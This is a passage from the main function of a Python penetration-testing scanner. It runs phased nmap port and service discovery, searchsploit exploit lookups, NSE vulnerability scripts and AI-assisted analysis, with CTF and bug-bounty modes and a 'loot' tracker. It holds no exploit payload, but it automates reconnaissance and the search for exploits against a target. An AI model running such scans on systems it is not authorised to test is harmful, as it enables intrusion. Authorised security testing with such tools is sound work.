        info(f"Resolved:   {C.Y}{resolved_ip}{C.Re}")
    info(f"Output:     {C.Y}{outdir}{C.Re}")
    info(f"Timing:     {C.Y}{args.timing}{C.Re}")
    info(f"Mode:       {C.Y}{mode_label}{' + UDP' if args.udp else ''}{' + fast' if args.fast else ''}{C.Re}")
    info(f"AI:         {C.Y}{ai_label}{C.Re}")
    if args.ctf:
        info(f"CTF Mode:   {C.G}ENABLED{C.Re}")
    if args.bb:
        info(f"BB Mode:    {C.G}ENABLED (safe scans){C.Re}")
    if args.vhosts:
        info(f"VHosts:     {C.G}ENABLED{C.Re}")

    # Check tools
    tools = check_tools()
    available = sorted([t for t, p in tools.items() if p])
    info(f"Tools:      {C.Di}{', '.join(available[:15]) + ('...' if len(available) > 15 else '') if available else 'none'}{C.Re}")
    info(f"NSE Dir:    {C.Di}{NSE_DIR}{C.Re}")

    # Check nmap
    try:
        r = subprocess.run(['nmap', '--version'], capture_output=True, text=True, timeout=5)
        nmap_ver = r.stdout.split('\n')[0] if r.stdout else 'unknown'
        info(f"Nmap:       {C.Di}{nmap_ver}{C.Re}")
    except Exception:
        error("nmap not found!")
        sys.exit(1)

    # Write scan metadata for resume support
    scan_meta = {
        'version': VERSION,
        'target': target,
        'resolved_ip': resolved_ip,
        'hostname': input_hostname,
        'args': {k: v for k, v in vars(args).items() if not callable(v)},
        'start_time': datetime.datetime.now().isoformat(),
    }
    try:
        (outdir / 'scan_meta.json').write_text(json.dumps(scan_meta, indent=2, default=str))
    except Exception:
        pass

    # Initialize loot tracker
    loot = LootTracker()

    # ── Phase 1: Port Discovery ──
    if args.ports:
        open_ports = sorted([int(p.strip()) for p in args.ports.split(',') if p.strip().isdigit()])
        good(f"Using provided ports: {open_ports}")
    elif args.resume and (outdir / 'phase1_tcp.xml').exists():
        good(f"[resume] Reusing phase1_tcp.xml")
        open_ports = sorted(parse_xml(outdir / 'phase1_tcp.xml').get('ports', []))
    else:
        open_ports = phase1_ports(target, outdir, args, api_key)

    if not open_ports:
        error("No open ports found. Exiting.")
        return

    # ── Phase 2: Service Detection ──
    if args.resume and (outdir / 'phase2_services.xml').exists():
        good(f"[resume] Reusing phase2_services.xml")
        services = parse_xml(outdir / 'phase2_services.xml').get('services', {})
    else:
        services = phase2_services(target, open_ports, outdir, args, api_key)

    if not services:
        warn("No services identified - creating minimal entries")
        services = {}
        for p in open_ports:
            services[p] = {
                'port': p, 'proto': 'tcp', 'service': '', 'product': '',
                'version': '', 'extra': '', 'tunnel': '', 'scripts': {},
            }

    vulns = check_vulns(services)

    # ── Hostname discovery from TLS/HTTP ──
    hostnames = []
    if any(p in (443, 8443, 9443) or services[p].get('tunnel') == 'ssl' for p in services):
        subsection("Hostname Discovery (TLS SAN / HTTP redirect)")
        hostnames = extract_hostnames_from_services(services, target, outdir)
        if input_hostname:
            hostnames = sorted(set(hostnames) | {input_hostname})
        if hostnames:
            good(f"Discovered hostname(s): {', '.join(hostnames[:10])}")
            # Write discovered hostnames
            (outdir / 'hostnames.txt').write_text('\n'.join(hostnames))
            if loot:
                for h in hostnames:
                    loot.add('notes', f"hostname: {h}")
            # /etc/hosts suggestion
            if not input_hostname:
                print(f"\n  {C.Y}Add to /etc/hosts:{C.Re}")
                for h in hostnames[:5]:
                    print(f"    {resolved_ip} {h}")
            if args.update_hosts:
                resolve_and_update_hosts(resolved_ip, hostnames, apply=True)

    # ── Searchsploit: Auto-lookup after service detection ──
    sploit_results = {}
    if shutil.which('searchsploit'):
        subsection("Searchsploit Auto-Lookup")
        p2_xml = outdir / 'phase2_services.xml'
        if p2_xml.exists():
            nmap_sploit = run_searchsploit_nmap(p2_xml)
            if nmap_sploit.strip():
                info("searchsploit --nmap results:")
                for line in nmap_sploit.strip().split('\n')[:25]:
                    if line.strip():
                        print(f"    {line}")
                (outdir / 'searchsploit_nmap.txt').write_text(nmap_sploit)
        sploit_results = searchsploit_services(services, outdir)
        if sploit_results and loot:
            for query, results in sploit_results.items():
                loot.add('notes', f"Searchsploit: {len(results)} exploit(s) for '{query}'")

    # ── Phase 3: Targeted Scripts ──
    phase3_results = phase3_scripts(target, services, outdir, args, api_key, loot)
    for port, svc_data in phase3_results.items():
        if port in services and svc_data.get('scripts'):
            services[port].setdefault('scripts', {}).update(svc_data.get('scripts', {}))

    # Check config-level vulnerabilities from host scripts
    host_scripts = {}
    for xml_file in outdir.glob('phase3_*.xml'):
        parsed = parse_xml(xml_file)
        host_scripts.update(parsed.get('scripts', {}))
    config_vulns = check_config_vulns(services, host_scripts)
    if config_vulns:
        print(f"\n  {C.R}{C.Bo}CONFIGURATION ISSUES DETECTED:{C.Re}")
        for v in config_vulns:
            print(f"    {C.R}{v['desc']}{C.Re}")
            if v['exploit']:
                print(f"    {C.Y}  => {v['exploit']}{C.Re}")
        vulns.extend(config_vulns)

    # ── Phase 4: Vulnerability Scan ──
    if not args.no_vuln:
        p4_vulns = phase4_vuln(target, open_ports, outdir, args, api_key, loot)
        if p4_vulns:
            vulns.extend(p4_vulns)
            good(f"Phase 4 added {len(p4_vulns)} finding(s) to vuln list")

    # ── Phase 5: Supplementary Tools ──
    if not args.no_extra:
        p5_vulns = phase5_tools(target, services, outdir, args, tools, api_key, loot, hostnames=hostnames)
        if p5_vulns:
            vulns.extend(p5_vulns)
            good(f"Phase 5 added {len(p5_vulns)} finding(s) to vuln list")

    # ── Phase 6: Analysis & Report ──
    os_info = []
    p2_xml = outdir / 'phase2_services.xml'
    if p2_xml.exists():
        os_info = parse_xml(p2_xml).get('os', [])

    phase6_analysis(target, services, vulns, outdir, args, api_key, loot, os_info,
                    sploit_results=sploit_results, puter_token=puter_token,
                    hostnames=hostnames)

    # Write end-time
    try:
        scan_meta['end_time'] = datetime.datetime.now().isoformat()
        (outdir / 'scan_meta.json').write_text(json.dumps(scan_meta, indent=2, default=str))
    except Exception:
        pass

    # ── Final Summary ──
    section("SCAN COMPLETE")
    good(f"Target:   {target}")
    good(f"Ports:    {len(open_ports)} open")
    good(f"Services: {len(services)} identified")
    good(f"Vulns:    {len(vulns)} potential")
    if hostnames:
        good(f"Hosts:    {len(hostnames)} hostnames discovered")
    good(f"Output:   {outdir}")
    if latest.exists():
        info(f"  Shortcut: {latest}")
    print(f"\n  {C.Bo}Output files:{C.Re}")
    for f in sorted(outdir.iterdir()):
        try:
            size = f.stat().st_size
        except Exception:
            continue
        label = f"  {f.name}"
        if size > 0:
            print(f"    {C.G}{label:<45}{C.Di}({size:,} bytes){C.Re}")
        else:
            print(f"    {C.Di}{label}{C.Re}")

    return {
        'target': target,
        'ports': len(open_ports),
        'services': len(services),
        'vulns': len(vulns),
        'outdir': str(outdir),
    }


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}  [!] Interrupted by user{C.Re}")
        sys.exit(130)
    except Exception as e:
        error(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
